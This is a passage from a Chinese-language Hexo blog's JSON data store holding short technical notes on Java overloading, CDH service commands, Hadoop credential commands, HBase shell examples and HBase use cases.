城市代码不是字典项，怎么处理\n","slug":"问题","published":1,"updated":"2018-07-10T13:10:09.866Z","_id":"cjjedmh7v00160gtjwuh0ty52","comments":1,"layout":"post","photos":[],"link":"","content":"<ol>\n<li>编码要不要转成对应的文字</li>\n<li>城市代码不是字典项，怎么处理</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<ol>\n<li>编码要不要转成对应的文字</li>\n<li>城市代码不是字典项，怎么处理</li>\n</ol>\n"},{"title":"重载和重写","date":"2018-06-18T08:04:15.000Z","_content":"\nhttp://www.cnblogs.com/bluestorm/archive/2012/03/01/2376236.html\n#### 1.重载\n#### 2.重写\n\n\n\n\n\n\n\n#### 3.比较\n重载 | 重写\n---|---\n方法名 | \n参数 | \n返回值 |\n异常 |\n\n","source":"_posts/重载和重写.md","raw":"---\ntitle: 重载和重写\ndate: 2018-06-18 16:04:15\ntags: note\n---\n\nhttp://www.cnblogs.com/bluestorm/archive/2012/03/01/2376236.html\n#### 1.重载\n#### 2.重写\n\n\n\n\n\n\n\n#### 3.比较\n重载 | 重写\n---|---\n方法名 | \n参数 | \n返回值 |\n异常 |\n\n","slug":"重载和重写","published":1,"updated":"2018-07-10T13:10:09.865Z","_id":"cjjedmh7w00180gtj55r07wyo","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"http://www.cnblogs.com/bluestorm/archive/2012/03/01/2376236.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/bluestorm/archive/2012/03/01/2376236.html</a></p>\n<h4 id=\"1-重载\"><a href=\"#1-重载\" class=\"headerlink\" title=\"1.重载\"></a>1.重载</h4><h4 id=\"2-重写\"><a href=\"#2-重写\" class=\"headerlink\" title=\"2.重写\"></a>2.重写</h4><h4 id=\"3-比较\"><a href=\"#3-比较\" class=\"headerlink\" title=\"3.比较\"></a>3.比较</h4><table>\n<thead>\n<tr>\n<th>重载</th>\n<th>重写</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>方法名</td>\n<td></td>\n</tr>\n<tr>\n<td>参数</td>\n<td></td>\n</tr>\n<tr>\n<td>返回值</td>\n<td></td>\n</tr>\n<tr>\n<td>异常</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://www.cnblogs.com/bluestorm/archive/2012/03/01/2376236.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/bluestorm/archive/2012/03/01/2376236.html</a></p>\n<h4 id=\"1-重载\"><a href=\"#1-重载\" class=\"headerlink\" title=\"1.重载\"></a>1.重载</h4><h4 id=\"2-重写\"><a href=\"#2-重写\" class=\"headerlink\" title=\"2.重写\"></a>2.重写</h4><h4 id=\"3-比较\"><a href=\"#3-比较\" class=\"headerlink\" title=\"3.比较\"></a>3.比较</h4><table>\n<thead>\n<tr>\n<th>重载</th>\n<th>重写</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>方法名</td>\n<td></td>\n</tr>\n<tr>\n<td>参数</td>\n<td></td>\n</tr>\n<tr>\n<td>返回值</td>\n<td></td>\n</tr>\n<tr>\n<td>异常</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n"},{"title":"CDH","date":"2018-07-10T13:09:19.000Z","_content":"- #### 启动\n    `service cloudera-scm-server start`\n- #### 查询 Service Monitor 时发生内部错误\n    重启service cloudera-scm-server restart\n- #### cdh日志目录\n    /var/log/cloudera-scm-server","source":"_posts/Hadoop/CDH.md","raw":"---\ntitle: CDH\ndate: 2018-07-10 21:09:19\ntags: Hadoop\n---\n- #### 启动\n    `service cloudera-scm-server start`\n- #### 查询 Service Monitor 时发生内部错误\n    重启service cloudera-scm-server restart\n- #### cdh日志目录\n    /var/log/cloudera-scm-server","slug":"Hadoop/CDH","published":1,"updated":"2018-07-10T13:10:09.868Z","_id":"cjjedmh8r001b0gtj134bc520","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li><h4 id=\"启动\"><a href=\"#启动\" class=\"headerlink\" title=\"启动\"></a>启动</h4>  <code>service cloudera-scm-server start</code></li>\n<li><h4 id=\"查询-Service-Monitor-时发生内部错误\"><a href=\"#查询-Service-Monitor-时发生内部错误\" class=\"headerlink\" title=\"查询 Service Monitor 时发生内部错误\"></a>查询 Service Monitor 时发生内部错误</h4>  重启service cloudera-scm-server restart</li>\n<li><h4 id=\"cdh日志目录\"><a href=\"#cdh日志目录\" class=\"headerlink\" title=\"cdh日志目录\"></a>cdh日志目录</h4>  /var/log/cloudera-scm-server</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><h4 id=\"启动\"><a href=\"#启动\" class=\"headerlink\" title=\"启动\"></a>启动</h4>  <code>service cloudera-scm-server start</code></li>\n<li><h4 id=\"查询-Service-Monitor-时发生内部错误\"><a href=\"#查询-Service-Monitor-时发生内部错误\" class=\"headerlink\" title=\"查询 Service Monitor 时发生内部错误\"></a>查询 Service Monitor 时发生内部错误</h4>  重启service cloudera-scm-server restart</li>\n<li><h4 id=\"cdh日志目录\"><a href=\"#cdh日志目录\" class=\"headerlink\" title=\"cdh日志目录\"></a>cdh日志目录</h4>  /var/log/cloudera-scm-server</li>\n</ul>\n"},{"title":"Cache file","date":"2018-07-10T13:09:19.000Z","_content":"```\n2018-01-05 10:02:13,061 ERROR [main] com.accept:===========/user/hive/warehouse/hs_mid.db/mid_accept_bopbusitypeinfo/000000_0\n2018-01-05 10:02:13,061 ERROR [main] com.accept: ===============/user/hive/warehouse/hs_mid.db/mid_accept_bopbusitypeinfo/000000_0\n2018-01-05 10:02:13,062 ERROR [main] com.accept: =========/user/hive/warehouse/hs_mid.db/mid_accept_bopbusitypeinfo/000000_0\n```","source":"_posts/Hadoop/Cache file.md","raw":"---\ntitle: Cache file\ndate: 2018-07-10 21:09:19\ntags: Hadoop\n---\n```\n2018-01-05 10:02:13,061 ERROR [main] com.accept:===========/user/hive/warehouse/hs_mid.db/mid_accept_bopbusitypeinfo/000000_0\n2018-01-05 10:02:13,061 ERROR [main] com.accept: ===============/user/hive/warehouse/hs_mid.db/mid_accept_bopbusitypeinfo/000000_0\n2018-01-05 10:02:13,062 ERROR [main] com.accept: =========/user/hive/warehouse/hs_mid.db/mid_accept_bopbusitypeinfo/000000_0\n```","slug":"Hadoop/Cache file","published":1,"updated":"2018-07-10T13:10:09.867Z","_id":"cjjedmh8u001d0gtjny0zp7hl","comments":1,"layout":"post","photos":[],"link":"","content":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2018-01-05 10:02:13,061 ERROR [main] com.accept:===========/user/hive/warehouse/hs_mid.db/mid_accept_bopbusitypeinfo/000000_0</span><br><span class=\"line\">2018-01-05 10:02:13,061 ERROR [main] com.accept: ===============/user/hive/warehouse/hs_mid.db/mid_accept_bopbusitypeinfo/000000_0</span><br><span class=\"line\">2018-01-05 10:02:13,062 ERROR [main] com.accept: =========/user/hive/warehouse/hs_mid.db/mid_accept_bopbusitypeinfo/000000_0</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2018-01-05 10:02:13,061 ERROR [main] com.accept:===========/user/hive/warehouse/hs_mid.db/mid_accept_bopbusitypeinfo/000000_0</span><br><span class=\"line\">2018-01-05 10:02:13,061 ERROR [main] com.accept: ===============/user/hive/warehouse/hs_mid.db/mid_accept_bopbusitypeinfo/000000_0</span><br><span class=\"line\">2018-01-05 10:02:13,062 ERROR [main] com.accept: =========/user/hive/warehouse/hs_mid.db/mid_accept_bopbusitypeinfo/000000_0</span><br></pre></td></tr></table></figure>"},{"title":"Hadoop F A Q","date":"2018-07-10T13:09:19.000Z","_content":"https://wiki.apache.org/hadoop/FAQ","source":"_posts/Hadoop/Hadoop F A Q.md","raw":"---\ntitle: Hadoop F A Q\ndate: 2018-07-10 21:09:19\ntags: Hadoop\n---\nhttps://wiki.apache.org/hadoop/FAQ","slug":"Hadoop/Hadoop F A Q","published":1,"updated":"2018-07-10T13:10:09.870Z","_id":"cjjedmh8v001f0gtjl4ro1x6h","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"https://wiki.apache.org/hadoop/FAQ\" target=\"_blank\" rel=\"noopener\">https://wiki.apache.org/hadoop/FAQ</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"https://wiki.apache.org/hadoop/FAQ\" target=\"_blank\" rel=\"noopener\">https://wiki.apache.org/hadoop/FAQ</a></p>\n"},{"title":"文件读写","date":"2018-07-10T13:09:19.000Z","_content":"HTML5虽然可以让我们访问本地文件系统，但是js只能被动地读取，也就是说只有用户主动触发了文件读取行为，js才能访问到File Api，这通常发生在表单选择文件或者拖拽文件","source":"_posts/JavaScript/文件读写.md","raw":"---\ntitle: 文件读写\ndate: 2018-07-10 21:09:19\ntags: JavaScript\n---\nHTML5虽然可以让我们访问本地文件系统，但是js只能被动地读取，也就是说只有用户主动触发了文件读取行为，js才能访问到File Api，这通常发生在表单选择文件或者拖拽文件","slug":"JavaScript/文件读写","published":1,"updated":"2018-07-10T13:10:09.908Z","_id":"cjjedmh8w001g0gtj91a98lmw","comments":1,"layout":"post","photos":[],"link":"","content":"<p>HTML5虽然可以让我们访问本地文件系统，但是js只能被动地读取，也就是说只有用户主动触发了文件读取行为，js才能访问到File Api，这通常发生在表单选择文件或者拖拽文件</p>\n","site":{"data":{}},"excerpt":"","more":"<p>HTML5虽然可以让我们访问本地文件系统，但是js只能被动地读取，也就是说只有用户主动触发了文件读取行为，js才能访问到File Api，这通常发生在表单选择文件或者拖拽文件</p>\n"},{"title":"Hadoop 命令","date":"2018-07-10T13:09:19.000Z","_content":"\r\n[官网](http://hadoop.apache.org/docs/current/hadoop-project-dist/hadoop-common/CommandsManual.html)\r\n\r\ncredential\r\n```\r\nUsage: hadoop credential <subcommand> [options]\r\ncreate alias [-provider provider-path] [-strict] [-value credential-value]\r\ndelete alias [-provider provider-path] [-strict] [-f]\r\nlist [-provider provider-path] [-strict]\r\n```\r\n例子\r\n\r\n    hadoop credential list -provider jceks://file/tmp/test.jceks","source":"_posts/Hadoop/Hadoop 命令.md","raw":"---\ntitle: Hadoop 命令\ndate: 2018-07-10 21:09:19\ntags: Hadoop\n---\n\r\n[官网](http://hadoop.apache.org/docs/current/hadoop-project-dist/hadoop-common/CommandsManual.html)\r\n\r\ncredential\r\n```\r\nUsage: hadoop credential <subcommand> [options]\r\ncreate alias [-provider provider-path] [-strict] [-value credential-value]\r\ndelete alias [-provider provider-path] [-strict] [-f]\r\nlist [-provider provider-path] [-strict]\r\n```\r\n例子\r\n\r\n    hadoop credential list -provider jceks://file/tmp/test.jceks","slug":"Hadoop/Hadoop 命令","published":1,"updated":"2018-07-10T13:10:09.871Z","_id":"cjjedmh8x001h0gtj7ks2asxj","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"http://hadoop.apache.org/docs/current/hadoop-project-dist/hadoop-common/CommandsManual.html\" target=\"_blank\" rel=\"noopener\">官网</a></p>\n<p>credential</p>\n<pre><code>Usage: hadoop credential &lt;subcommand&gt; [options]\ncreate alias [-provider provider-path] [-strict] [-value credential-value]\ndelete alias [-provider provider-path] [-strict] [-f]\nlist [-provider provider-path] [-strict]\n</code></pre><p>例子</p>\n<pre><code>hadoop credential list -provider jceks://file/tmp/test.jceks\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://hadoop.apache.org/docs/current/hadoop-project-dist/hadoop-common/CommandsManual.html\" target=\"_blank\" rel=\"noopener\">官网</a></p>\n<p>credential</p>\n<pre><code>Usage: hadoop credential &lt;subcommand&gt; [options]\ncreate alias [-provider provider-path] [-strict] [-value credential-value]\ndelete alias [-provider provider-path] [-strict] [-f]\nlist [-provider provider-path] [-strict]\n</code></pre><p>例子</p>\n<pre><code>hadoop credential list -provider jceks://file/tmp/test.jceks\n</code></pre>"},{"title":"Hbase","date":"2018-07-10T13:09:19.000Z","_content":"Hbase介绍[链接](http://blog.csdn.net/frankiewang008/article/details/41965543)\n\n白话MySQL(RDBMS)与HBase之间\n\n![image](C:\\Users\\hanqian18790\\Desktop\\clipboard.png)\n\n\n原来系统中有2张表blogtable和comment表，采用HBase后只有一张blogtable表，如果按照传统的RDBMS的话，blogtable表中的列是固定的，比如schema 定义了Author,Title,URL,text等属性，上线后表字段是不能动态增加的。但是如果采用列存储系统，比如Hbase，那么我们可以定义blogtable表，然后定义info 列族，User的数据可以分为：info:title ,info:author ,info:url 等，如果后来你又想增加另外的属性，这样很方便只需要 info:xxx 就可以了。\n\n对于Row key你可以理解row key为传统RDBMS中的某一个行的主键，Hbase是不支持条件查询以及Order by等查询，因此Row key的设计就要根据你系统的查询需求来设计了额。 Hbase中的记录是按照rowkey来排序的，这样就使得查询变得非常快。\n\n具体操作过程如下：\n\n创建blogtable表\n\n create 'blogtable', 'info','text','comment_title','comment_author','comment_text'\n  \n插入概要信息\n\n put 'blogtable', '1', 'info:title', 'this is doc title'\n put 'blogtable', '1', 'info:author', 'javabloger'\n put 'blogtable', '1', 'info:url', 'http://www.javabloger.com/index.php'\n \n put 'blogtable', '2', 'info:title', 'this is doc title2'\n put 'blogtable', '2', 'info:author', 'H.E.'\n put 'blogtable', '2', 'info:url', 'http://www.javabloger.com/index.html'\n \n插入正文信息\n\n put 'blogtable', '1', 'text:', 'what is this doc context ?'\n put 'blogtable', '2', 'text:', 'what is this doc context2?'\n \n插入评论信息\n\n put 'blogtable', '1', 'comment_title:', 'this is doc comment_title '\n put 'blogtable', '1', 'comment_author:', 'javabloger'\n put 'blogtable', '1', 'comment_text:', 'this is nice doc'\n \n put 'blogtable', '2', 'comment_title:', 'this is blog comment_title '\n put 'blogtable', '2', 'comment_author:', 'H.E.'\n put 'blogtable', '2', 'comment_text:', 'this is nice blog' \n\nHBase的数据查询\\读取，可以通过单个row key访问，row key的range和全表扫描,大致如下：\n注意：HBase不能支持where条件、Order by 查询，只支持按照Row key来查询，但是可以通过HBase提供的API进行条件过滤。\n例如：http://hbase.apache.org/apidocs/org/apache/hadoop/hbase/filter/ColumnPrefixFilter.html\n\nscan 'blogtable' ,{COLUMNS => ['text:','info:title'] } —> 列出 文章的内容和标题\n\nscan 'blogtable' , {COLUMNS => 'info:url' , STARTROW => '2'} —> 根据范围列出 文章的内容和标题\n\nget 'blogtable','1' —> 列出 文章id 等于1的数据\n\nget 'blogtable','1', {COLUMN => 'info'} —> 列出 文章id 等于1 的 info 的头(Head)内容\n\nget 'blogtable','1', {COLUMN => 'text'} —> 列出 文章id 等于1 的 text 的具体(Body)内容\n\nget 'blogtable','1', {COLUMN => ['text','info:author']} —> 列出 文章id 等于1 的内容和作者(Body/Author)内容","source":"_posts/Hadoop/Hbase.md","raw":"---\ntitle: Hbase\ndate: 2018-07-10 21:09:19\ntags: Hadoop\n---\nHbase介绍[链接](http://blog.csdn.net/frankiewang008/article/details/41965543)\n\n白话MySQL(RDBMS)与HBase之间\n\n![image](C:\\Users\\hanqian18790\\Desktop\\clipboard.png)\n\n\n原来系统中有2张表blogtable和comment表，采用HBase后只有一张blogtable表，如果按照传统的RDBMS的话，blogtable表中的列是固定的，比如schema 定义了Author,Title,URL,text等属性，上线后表字段是不能动态增加的。但是如果采用列存储系统，比如Hbase，那么我们可以定义blogtable表，然后定义info 列族，User的数据可以分为：info:title ,info:author ,info:url 等，如果后来你又想增加另外的属性，这样很方便只需要 info:xxx 就可以了。\n\n对于Row key你可以理解row key为传统RDBMS中的某一个行的主键，Hbase是不支持条件查询以及Order by等查询，因此Row key的设计就要根据你系统的查询需求来设计了额。 Hbase中的记录是按照rowkey来排序的，这样就使得查询变得非常快。\n\n具体操作过程如下：\n\n创建blogtable表\n\n create 'blogtable', 'info','text','comment_title','comment_author','comment_text'\n  \n插入概要信息\n\n put 'blogtable', '1', 'info:title', 'this is doc title'\n put 'blogtable', '1', 'info:author', 'javabloger'\n put 'blogtable', '1', 'info:url', 'http://www.javabloger.com/index.php'\n \n put 'blogtable', '2', 'info:title', 'this is doc title2'\n put 'blogtable', '2', 'info:author', 'H.E.'\n put 'blogtable', '2', 'info:url', 'http://www.javabloger.com/index.html'\n \n插入正文信息\n\n put 'blogtable', '1', 'text:', 'what is this doc context ?'\n put 'blogtable', '2', 'text:', 'what is this doc context2?'\n \n插入评论信息\n\n put 'blogtable', '1', 'comment_title:', 'this is doc comment_title '\n put 'blogtable', '1', 'comment_author:', 'javabloger'\n put 'blogtable', '1', 'comment_text:', 'this is nice doc'\n \n put 'blogtable', '2', 'comment_title:', 'this is blog comment_title '\n put 'blogtable', '2', 'comment_author:', 'H.E.'\n put 'blogtable', '2', 'comment_text:', 'this is nice blog' \n\nHBase的数据查询\\读取，可以通过单个row key访问，row key的range和全表扫描,大致如下：\n注意：HBase不能支持where条件、Order by 查询，只支持按照Row key来查询，但是可以通过HBase提供的API进行条件过滤。\n例如：http://hbase.apache.org/apidocs/org/apache/hadoop/hbase/filter/ColumnPrefixFilter.html\n\nscan 'blogtable' ,{COLUMNS => ['text:','info:title'] } —> 列出 文章的内容和标题\n\nscan 'blogtable' , {COLUMNS => 'info:url' , STARTROW => '2'} —> 根据范围列出 文章的内容和标题\n\nget 'blogtable','1' —> 列出 文章id 等于1的数据\n\nget 'blogtable','1', {COLUMN => 'info'} —> 列出 文章id 等于1 的 info 的头(Head)内容\n\nget 'blogtable','1', {COLUMN => 'text'} —> 列出 文章id 等于1 的 text 的具体(Body)内容\n\nget 'blogtable','1', {COLUMN => ['text','info:author']} —> 列出 文章id 等于1 的内容和作者(Body/Author)内容","slug":"Hadoop/Hbase","published":1,"updated":"2018-07-10T13:10:09.876Z","_id":"cjjedmh8z001k0gtjsm9yx6bi","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Hbase介绍<a href=\"http://blog.csdn.net/frankiewang008/article/details/41965543\" target=\"_blank\" rel=\"noopener\">链接</a></p>\n<p>白话MySQL(RDBMS)与HBase之间</p>\n<p><img src=\"C:\\Users\\hanqian18790\\Desktop\\clipboard.png\" alt=\"image\"></p>\n<p>原来系统中有2张表blogtable和comment表，采用HBase后只有一张blogtable表，如果按照传统的RDBMS的话，blogtable表中的列是固定的，比如schema 定义了Author,Title,URL,text等属性，上线后表字段是不能动态增加的。但是如果采用列存储系统，比如Hbase，那么我们可以定义blogtable表，然后定义info 列族，User的数据可以分为：info:title ,info:author ,info:url 等，如果后来你又想增加另外的属性，这样很方便只需要 info:xxx 就可以了。</p>\n<p>对于Row key你可以理解row key为传统RDBMS中的某一个行的主键，Hbase是不支持条件查询以及Order by等查询，因此Row key的设计就要根据你系统的查询需求来设计了额。 Hbase中的记录是按照rowkey来排序的，这样就使得查询变得非常快。</p>\n<p>具体操作过程如下：</p>\n<p>创建blogtable表</p>\n<p> create ‘blogtable’, ‘info’,’text’,’comment_title’,’comment_author’,’comment_text’</p>\n<p>插入概要信息</p>\n<p> put ‘blogtable’, ‘1’, ‘info:title’, ‘this is doc title’<br> put ‘blogtable’, ‘1’, ‘info:author’, ‘javabloger’<br> put ‘blogtable’, ‘1’, ‘info:url’, ‘<a href=\"http://www.javabloger.com/index.php&#39;\" target=\"_blank\" rel=\"noopener\">http://www.javabloger.com/index.php&#39;</a></p>\n<p> put ‘blogtable’, ‘2’, ‘info:title’, ‘this is doc title2’<br> put ‘blogtable’, ‘2’, ‘info:author’, ‘H.E.’<br> put ‘blogtable’, ‘2’, ‘info:url’, ‘<a href=\"http://www.javabloger.com/index.html&#39;\" target=\"_blank\" rel=\"noopener\">http://www.javabloger.com/index.html&#39;</a></p>\n<p>插入正文信息</p>\n<p> put ‘blogtable’, ‘1’, ‘text:’, ‘what is this doc context ?’<br> put ‘blogtable’, ‘2’, ‘text:’, ‘what is this doc context2?’</p>\n<p>插入评论信息</p>\n<p> put ‘blogtable’, ‘1’, ‘comment_title:’, ‘this is doc comment_title ‘<br> put ‘blogtable’, ‘1’, ‘comment_author:’, ‘javabloger’<br> put ‘blogtable’, ‘1’, ‘comment_text:’, ‘this is nice doc’</p>\n<p> put ‘blogtable’, ‘2’, ‘comment_title:’, ‘this is blog comment_title ‘<br> put ‘blogtable’, ‘2’, ‘comment_author:’, ‘H.E.’<br> put ‘blogtable’, ‘2’, ‘comment_text:’, ‘this is nice blog’ </p>\n<p>HBase的数据查询\\读取，可以通过单个row key访问，row key的range和全表扫描,大致如下：<br>注意：HBase不能支持where条件、Order by 查询，只支持按照Row key来查询，但是可以通过HBase提供的API进行条件过滤。<br>例如：<a href=\"http://hbase.apache.org/apidocs/org/apache/hadoop/hbase/filter/ColumnPrefixFilter.html\" target=\"_blank\" rel=\"noopener\">http://hbase.apache.org/apidocs/org/apache/hadoop/hbase/filter/ColumnPrefixFilter.html</a></p>\n<p>scan ‘blogtable’ ,{COLUMNS =&gt; [‘text:’,’info:title’] } —&gt; 列出 文章的内容和标题</p>\n<p>scan ‘blogtable’ , {COLUMNS =&gt; ‘info:url’ , STARTROW =&gt; ‘2’} —&gt; 根据范围列出 文章的内容和标题</p>\n<p>get ‘blogtable’,’1’ —&gt; 列出 文章id 等于1的数据</p>\n<p>get ‘blogtable’,’1’, {COLUMN =&gt; ‘info’} —&gt; 列出 文章id 等于1 的 info 的头(Head)内容</p>\n<p>get ‘blogtable’,’1’, {COLUMN =&gt; ‘text’} —&gt; 列出 文章id 等于1 的 text 的具体(Body)内容</p>\n<p>get ‘blogtable’,’1’, {COLUMN =&gt; [‘text’,’info:author’]} —&gt; 列出 文章id 等于1 的内容和作者(Body/Author)内容</p>\n","site":{"data":{}},"excerpt":"","more":"<p>Hbase介绍<a href=\"http://blog.csdn.net/frankiewang008/article/details/41965543\" target=\"_blank\" rel=\"noopener\">链接</a></p>\n<p>白话MySQL(RDBMS)与HBase之间</p>\n<p><img src=\"C:\\Users\\hanqian18790\\Desktop\\clipboard.png\" alt=\"image\"></p>\n<p>原来系统中有2张表blogtable和comment表，采用HBase后只有一张blogtable表，如果按照传统的RDBMS的话，blogtable表中的列是固定的，比如schema 定义了Author,Title,URL,text等属性，上线后表字段是不能动态增加的。但是如果采用列存储系统，比如Hbase，那么我们可以定义blogtable表，然后定义info 列族，User的数据可以分为：info:title ,info:author ,info:url 等，如果后来你又想增加另外的属性，这样很方便只需要 info:xxx 就可以了。</p>\n<p>对于Row key你可以理解row key为传统RDBMS中的某一个行的主键，Hbase是不支持条件查询以及Order by等查询，因此Row key的设计就要根据你系统的查询需求来设计了额。 Hbase中的记录是按照rowkey来排序的，这样就使得查询变得非常快。</p>\n<p>具体操作过程如下：</p>\n<p>创建blogtable表</p>\n<p> create ‘blogtable’, ‘info’,’text’,’comment_title’,’comment_author’,’comment_text’</p>\n<p>插入概要信息</p>\n<p> put ‘blogtable’, ‘1’, ‘info:title’, ‘this is doc title’<br> put ‘blogtable’, ‘1’, ‘info:author’, ‘javabloger’<br> put ‘blogtable’, ‘1’, ‘info:url’, ‘<a href=\"http://www.javabloger.com/index.php&#39;\" target=\"_blank\" rel=\"noopener\">http://www.javabloger.com/index.php&#39;</a></p>\n<p> put ‘blogtable’, ‘2’, ‘info:title’, ‘this is doc title2’<br> put ‘blogtable’, ‘2’, ‘info:author’, ‘H.E.’<br> put ‘blogtable’, ‘2’, ‘info:url’, ‘<a href=\"http://www.javabloger.com/index.html&#39;\" target=\"_blank\" rel=\"noopener\">http://www.javabloger.com/index.html&#39;</a></p>\n<p>插入正文信息</p>\n<p> put ‘blogtable’, ‘1’, ‘text:’, ‘what is this doc context ?’<br> put ‘blogtable’, ‘2’, ‘text:’, ‘what is this doc context2?’</p>\n<p>插入评论信息</p>\n<p> put ‘blogtable’, ‘1’, ‘comment_title:’, ‘this is doc comment_title ‘<br> put ‘blogtable’, ‘1’, ‘comment_author:’, ‘javabloger’<br> put ‘blogtable’, ‘1’, ‘comment_text:’, ‘this is nice doc’</p>\n<p> put ‘blogtable’, ‘2’, ‘comment_title:’, ‘this is blog comment_title ‘<br> put ‘blogtable’, ‘2’, ‘comment_author:’, ‘H.E.’<br> put ‘blogtable’, ‘2’, ‘comment_text:’, ‘this is nice blog’ </p>\n<p>HBase的数据查询\\读取，可以通过单个row key访问，row key的range和全表扫描,大致如下：<br>注意：HBase不能支持where条件、Order by 查询，只支持按照Row key来查询，但是可以通过HBase提供的API进行条件过滤。<br>例如：<a href=\"http://hbase.apache.org/apidocs/org/apache/hadoop/hbase/filter/ColumnPrefixFilter.html\" target=\"_blank\" rel=\"noopener\">http://hbase.apache.org/apidocs/org/apache/hadoop/hbase/filter/ColumnPrefixFilter.html</a></p>\n<p>scan ‘blogtable’ ,{COLUMNS =&gt; [‘text:’,’info:title’] } —&gt; 列出 文章的内容和标题</p>\n<p>scan ‘blogtable’ , {COLUMNS =&gt; ‘info:url’ , STARTROW =&gt; ‘2’} —&gt; 根据范围列出 文章的内容和标题</p>\n<p>get ‘blogtable’,’1’ —&gt; 列出 文章id 等于1的数据</p>\n<p>get ‘blogtable’,’1’, {COLUMN =&gt; ‘info’} —&gt; 列出 文章id 等于1 的 info 的头(Head)内容</p>\n<p>get ‘blogtable’,’1’, {COLUMN =&gt; ‘text’} —&gt; 列出 文章id 等于1 的 text 的具体(Body)内容</p>\n<p>get ‘blogtable’,’1’, {COLUMN =&gt; [‘text’,’info:author’]} —&gt; 列出 文章id 等于1 的内容和作者(Body/Author)内容</p>\n"},{"title":"Hbase应用场景","date":"2018-07-10T13:09:19.000Z","_content":"对象存储：我们知道不少的头条类、新闻类的的新闻、网页、图片存储在HBase之中，一些病毒公司的病毒库也是存储在HBase之中\r\n\r\n时序数据：HBase之上有OpenTSDB模块，可以满足时序类场景的需求\r\n\r\n推荐画像：特别是用户的画像，是一个比较大的稀疏矩阵，蚂蚁的风控就是构建在HBase之上\r\n\r\n时空数据：主要是轨迹、气象网格之类，滴滴打车的轨迹数据主要存在HBase之中，另外在技术所有大一点的数据量的车联网企业，数据都是存在HBase之中\r\n\r\nCubeDB OLAP：Kylin一个cube分析工具，底层的数据就是存储在HBase之中，不少客户自己基于离线计算构建cube存储在hbase之中，满足在线报表查询的需求\r\n\r\n消息/订单：在电信领域、银行领域，不少的订单查询底层的存储，另外不少通信、消息同步的应用构建在HBase之上\r\n\r\nFeeds流：典型的应用就是xx朋友圈类似的应用\r\n\r\nNewSQL：之上有Phoenix的插件，可以满足二级索引、SQL的需求，对接传统数据需要SQL非事务的需求","source":"_posts/Hadoop/Hbase应用场景.md","raw":"---\ntitle: Hbase应用场景\ndate: 2018-07-10 21:09:19\ntags: Hadoop\n---\n对象存储：我们知道不少的头条类、新闻类的的新闻、网页、图片存储在HBase之中，一些病毒公司的病毒库也是存储在HBase之中\r\n\r\n时序数据：HBase之上有OpenTSDB模块，可以满足时序类场景的需求\r\n\r\n推荐画像：特别是用户的画像，是一个比较大的稀疏矩阵，蚂蚁的风控就是构建在HBase之上\r\n\r\n时空数据：主要是轨迹、气象网格之类，滴滴打车的轨迹数据主要存在HBase之中，另外在技术所有大一点的数据量的车联网企业，数据都是存在HBase之中\r\n\r\nCubeDB OLAP：Kylin一个cube分析工具，底层的数据就是存储在HBase之中，不少客户自己基于离线计算构建cube存储在hbase之中，满足在线报表查询的需求\r\n\r\n消息/订单：在电信领域、银行领域，不少的订单查询底层的存储，另外不少通信、消息同步的应用构建在HBase之上\r\n\r\nFeeds流：典型的应用就是xx朋友圈类似的应用\r\n\r\nNewSQL：之上有Phoenix的插件，可以满足二级索引、SQL的需求，对接传统数据需要SQL非事务的需求","slug":"Hadoop/Hbase应用场景","published":1,"updated":"2018-07-10T13:10:09.877Z","_id":"cjjedmh8z001m0gtjqq7gwm2t","comments":1,"layout":"post","photos":[],"link":"","content":"<p>对象存储：我们知道不少的头条类、新闻类的的新闻、网页、图片存储在HBase之中，一些病毒公司的病毒库也是存储在HBase之中</p>\n<p>时序数据：HBase之上有OpenTSDB模块，可以满足时序类场景的需求</p>\n<p>推荐画像：特别是用户的画像，是一个比较大的稀疏矩阵，蚂蚁的风控就是构建在HBase之上</p>\n<p>时空数据：主要是轨迹、气象网格之类，滴滴打车的轨迹数据主要存在HBase之中，另外在技术所有大一点的数据量的车联网企业，数据都是存在HBase之中</p>\n<p>CubeDB OLAP：Kylin一个cube分析工具，底层的数据就是存储在HBase之中，不少客户自己基于离线计算构建cube存储在hbase之中，满足在线报表查询的需求</p>\n<p>消息/订单：在电信领域、银行领域，不少的订单查询底层的存储，另外不少通信、消息同步的应用构建在HBase之上</p>\n<p>Feeds流：典型的应用就是xx朋友圈类似的应用</p>\n<p>NewSQL：之上有Phoenix的插件，可以满足二级索引、SQL的需求，对接传统数据需要SQL非事务的需求</p>\n","site":{"data":{}},"excerpt":"","more":"<p>对象存储：我们知道不少的头条类、新闻类的的新闻、网页、图片存储在HBase之中，一些病毒公司的病毒库也是存储在HBase之中</p>\n<p>时序数据：HBase之上有OpenTSDB模块，可以满足时序类场景的需求</p>\n<p>推荐画像：特别是用户的画像，是一个比较大的稀疏矩阵，蚂蚁的风控就是构建在HBase之上</p>\n<p>时空数据：主要是轨迹、气象网格之类，滴滴打车的轨迹数据主要存在HBase之中，另外在技术所有大一点的数据量的车联网企业，数据都是存在HBase之中</p>\n<p>CubeDB 